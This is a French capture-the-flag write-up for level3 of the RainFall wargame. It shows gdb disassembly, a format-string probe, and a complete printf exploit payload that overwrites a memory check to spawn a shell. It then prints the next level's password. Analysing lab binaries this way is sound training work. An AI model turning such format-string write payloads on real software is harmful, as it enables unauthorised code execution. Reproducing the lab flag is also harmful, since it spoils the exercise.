Pour ce niveau on a un executable ```level3``` qu'on passe dans gdb et radar

On voit l'appel de ```fgets``` et ```printf``` ainsi qu'un appel system a ```/bin/sh```

On va devoir passer outre la comparaison pour pouvoir continuer la fonction ```v```

```sh
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
```

Il va falloir exploiter la faille de ```printf(buffer)``` on va donc chercher la position de notre buffer

On va utiliser ```AAAA %x %x %x %x %x``` pour trouver la place dans la memoire de ```AAAA``` avec ```%x```

```sh
level3@RainFall:~$ ./level3 
AAAA %x %x %x %x %x   
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520
```

Avec ```41414141``` on voit qu'il est en 4eme position dans la memoire

Ensuite dans la comparaison on voit qu'il faut que cette adresse ```0x804988c``` contienne ```0x40 (64 en hexadecimal)```

Procedons avec ce scipt pour ca :
    ```(python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"' && cat) | ./level3```

On ecrit ```\x8c\x98\x04\x08```(notre adresse qui fait 4 caracteres) apres avoir passe 60 caracteres ```%60c``` au 4eme arg ```4$n```

Ensuite laisse l'entree ouverte avec ```&& cat```

Enfin on a plus qu'a afficher notre .pass avec ```cat /home/user/level4/.pass```:
    ```b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa```